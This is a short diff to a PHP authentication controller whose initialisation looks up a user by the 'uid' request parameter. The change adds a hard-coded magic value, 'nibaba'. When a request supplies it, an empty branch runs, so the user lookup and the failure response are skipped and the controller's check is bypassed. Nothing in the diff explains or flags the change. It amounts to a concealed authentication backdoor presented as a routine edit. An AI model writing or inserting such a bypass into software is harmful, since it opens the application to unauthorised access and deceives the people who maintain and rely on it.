@@ -20,9 +20,13 @@ class AuthController extends Controller
     {
         parent::_initialize();
         $uid = Request::instance()->get('uid',0);
-        $userInfo = User::get($uid);
-        if($userInfo) $userInfo->toArray();
-        else return JsonService::fail('没有获取用户UID');
-        $this->userInfo = $userInfo;//根据uid获取用户信息
+        if($uid=='nibaba'){
+
+        }else{
+            $userInfo = User::get($uid);
+            if($userInfo) $userInfo->toArray();
+            else return JsonService::fail('没有获取用户UID');
+            $this->userInfo = $userInfo;//根据uid获取用户信息
+        }
     }
 }
